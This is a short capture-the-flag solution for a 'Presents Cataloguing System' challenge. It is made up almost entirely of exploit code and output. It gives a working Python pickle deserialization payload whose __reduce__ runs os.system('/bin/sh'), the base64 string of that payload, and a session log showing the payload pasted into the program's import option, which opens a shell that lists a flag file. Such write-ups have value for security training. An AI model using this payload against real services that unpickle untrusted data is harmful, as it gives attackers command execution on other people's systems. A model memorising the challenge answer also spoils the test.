# SOLUTION

To generate a payload:

```python
In [8]: import os
   ...: import cPickle
   ...:
   ...: # Exploit that we want the target to unpickle
   ...: class Exploit(object):
   ...:     def __reduce__(self):
   ...:         return (os.system, ('/bin/sh',))
   ...:
   ...: shellcode = cPickle.dumps(Exploit())
   ...: print shellcode.encode("base64")
   ...:
Y3Bvc2l4CnN5c3RlbQpwMQooUycvYmluL3NoJwpwMgp0cDMKUnA0Ci4=
```

The solution script:

```shell
Presents Cataloguing System for my Princess
    Select:
        1 - List Presents
        2 - Add Present
        3 - Delete Present
        4 - Export Presents
        5 - Import Presents
    Choice: 5

Enter your import: Y3Bvc2l4CnN5c3RlbQpwMQooUycvYmluL3NoJwpwMgp0cDMKUnA0Ci4=
ls -la
total 96
drwxr-x---  2 root angelicaservice  4096 May  5 09:48 .
drwx--x--x 11 root serviceuser      4096 May  5 09:45 ..
-r--r-x---  1 root angelicaservice  2044 May  5 09:48 angelica.py
-rwxr-x---  1 root angelicaservice   279 May  5 09:44 angelicaservice
-rwxr-x---  1 root angelicaservice 59070 May  5 09:40 art.ans
-rwxr-x---  1 root angelicaservice   220 Aug 31  2015 .bash_logout
-rwxr-x---  1 root angelicaservice  3771 Aug 31  2015 .bashrc
-rwxr-x---  1 root angelicaservice   276 May  5 09:40 dragraceservice
-rwxr-x---  1 root angelicaservice    30 May  5 09:40 flag
-rwxr-x---  1 root angelicaservice   655 May 16  2017 .profile
```
